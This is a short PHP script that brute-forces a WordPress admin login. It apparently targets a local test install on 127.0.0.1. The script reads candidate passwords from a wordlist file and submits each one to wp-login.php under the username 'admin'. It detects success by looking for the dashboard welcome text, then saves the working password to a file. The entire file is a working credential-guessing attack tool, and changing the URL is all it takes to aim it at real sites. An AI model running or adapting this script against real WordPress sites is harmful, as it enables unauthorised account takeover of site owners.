<?php
require 'get_web_page.php';

$username = "admin";
$password = "passwordholder";

//$url = 'http://localhost:8888/wp-login.php';
$url = 'http://127.0.0.1:8888/wp-login.php';

echo "\n";


$fileHere = fopen("smallList.txt", "r") or die ("Cant open file!");
while(!feof($fileHere)){

    //For visibility while testing
    echo "----------------------------------\n";
    echo "New one                           \n";
    echo "----------------------------------\n";
    $password = fgets($fileHere);

    //To see what passwords we are trying
    echo "The username we are trying is " .$username . " \n";
    echo "The current password we are trying is ... " . $password;
    echo "\n";

    $resultFromCurl = get_web_page( $url, $username, $password);
    // print_r($resultFromCurl);

    //If we see this, we know that we are logged in
    $needle = "Welcome to your WordPress Dashboard!";

    //Search the resultFromCurl content for the needle. It will be NOT false when it finds something (returned as an int)
    $checker = strpos($resultFromCurl['content'], $needle);
    //echo "checker var is $checker \n";
    


    if($checker){
        file_put_contents("passwordsThatWorked.txt", $password, FILE_APPEND);
        echo "It worked!! The password is $password \n";
        echo "Exiting.. \n";
        exit();
    }
    

}
echo "\n";
fclose($fileHere);

